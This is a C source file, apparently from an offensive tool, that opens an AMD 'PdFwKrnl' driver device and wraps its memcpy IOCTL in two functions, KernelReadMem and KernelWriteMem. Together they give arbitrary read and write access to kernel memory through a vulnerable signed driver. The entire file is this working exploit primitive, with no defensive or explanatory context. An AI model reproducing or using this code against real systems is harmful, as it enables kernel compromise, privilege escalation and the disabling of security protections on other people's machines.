#include "PdFwKrnl.h"
#include <stdio.h>

// -----------------------
// Functions
// -----------------------

HANDLE OpenPdFwDevice(VOID)
{
    HANDLE hDev = CreateFileW(
        PDFW_DEVICE_PATH,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL
    );

    if (hDev == INVALID_HANDLE_VALUE)
        printf("[-] OpenPdFwDevice failed: 0x%08lX\n", GetLastError());

    return hDev;
}

BOOL KernelReadMem(
    _In_  HANDLE    hDev,
    _In_  ULONG_PTR uAddr,
    _Out_ PVOID     pBuffer,
    _In_  SIZE_T    cbBuffer
)
{
    PDFW_MEMCPY stReq = { 0 };
    DWORD       dwRet = 0;

    stReq.Destination = pBuffer;
    stReq.Source      = (PVOID)uAddr;
    stReq.Size        = (DWORD)cbBuffer;

    return DeviceIoControl(
        hDev, IOCTL_AMDPDFW_MEMCPY,
        &stReq, sizeof(stReq),
        &stReq, sizeof(stReq),
        &dwRet, NULL
    );
}

BOOL KernelWriteMem(
    _In_ HANDLE    hDev,
    _In_ ULONG_PTR uAddr,
    _In_ PVOID     pBuffer,
    _In_ SIZE_T    cbBuffer
)
{
    PDFW_MEMCPY stReq = { 0 };
    DWORD       dwRet = 0;

    stReq.Destination = (PVOID)uAddr;
    stReq.Source      = pBuffer;
    stReq.Size        = (DWORD)cbBuffer;

    return DeviceIoControl(
        hDev, IOCTL_AMDPDFW_MEMCPY,
        &stReq, sizeof(stReq),
        &stReq, sizeof(stReq),
        &dwRet, NULL
    );
}
